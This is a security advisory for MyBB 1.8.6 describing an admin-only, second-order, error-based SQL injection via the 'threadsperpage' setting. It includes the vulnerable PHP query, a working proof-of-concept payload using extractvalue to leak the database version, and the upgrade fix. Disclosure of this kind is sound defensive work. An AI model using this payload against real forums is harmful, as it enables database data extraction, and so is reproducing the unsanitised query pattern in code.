2. Overview

MyBB is forum software written in PHP. In version 1.8.6, it is vulnerable to a
second order SQL injection by an authenticated admin user, allowing the
extraction of data from the database.

3. Details

Description

CVSS: Medium 6.0 AV:N/AC:M/Au:S/C:P/I:P/A:P

The setting threadsperpage is vulnerable to second order error based SQL
injection. An admin account is needed to change this setting.

The injection takes place into a LIMIT clause, and the query also uses ORDER
BY, making an injection of UNION ALL not possible, but it is still possibly to
extract information.

Proof of Concept

Go to the settings page:
    http://localhost/mybb_1806/Upload/admin/index.php?module=config-settings&action=change&gid=7

For Setting "threadsperpage" use:
    20 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);

Visit a forum to trigger injected code:
    http://localhost/mybb_1806/Upload/forumdisplay.php?fid=3

The result will be:
    SQL Error:
        1105 - XPATH syntax error: ':5.5.33-1'
    Query:
        SELECT t.*, (t.totalratings/t.numratings) AS averagerating, t.username AS threadusername, u.username FROM mybb_threads t LEFT JOIN mybb_users u ON (u.uid = t.uid) WHERE t.fid='3' AND t.visible IN (-1,0,1) ORDER BY t.sticky DESC, t.lastpost desc LIMIT 0, 20 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);

Code

forumdisplay.php
    $perpage = $mybb->settings['threadsperpage'];
    [...]
	$query = $db->query("
		SELECT t.*, {$ratingadd}t.username AS threadusername, u.username
		FROM ".TABLE_PREFIX."threads t
		LEFT JOIN ".TABLE_PREFIX."users u ON (u.uid = t.uid)
		WHERE t.fid='$fid' $tuseronly $tvisibleonly $datecutsql2 $prefixsql2
		ORDER BY t.sticky DESC, {$t}{$sortfield} $sortordernow $sortfield2
		LIMIT $start, $perpage
	");

4. Solution

To mitigate this issue please upgrade at least to version 1.8.7:
